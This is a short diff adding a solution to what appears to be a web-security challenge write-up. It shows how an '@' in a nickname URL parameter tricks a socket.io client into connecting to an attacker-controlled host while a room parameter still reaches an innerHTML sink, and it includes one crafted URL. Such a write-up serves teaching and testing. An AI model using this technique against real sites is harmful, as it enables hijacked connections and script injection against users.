@@ -37,3 +37,7 @@ socket.on('msg', msg => {
 ```
 
 ## Solution
+
+- Having an @ in our parameter. Everything before the @ is considered to be the username on the domain. http://127.0.0.1:58000/?nickname=@example.com/&room=DOMPurify is parsed as the domain example.com/&room=DOMPurify for the socket connection. At the same time, the get parameter room=DOMPurify allows us to still get into the innerHTML region in the client-side line of code
+
+This makes socket.io connect to the attackers server while using room=DOMPurify as query parameetr.
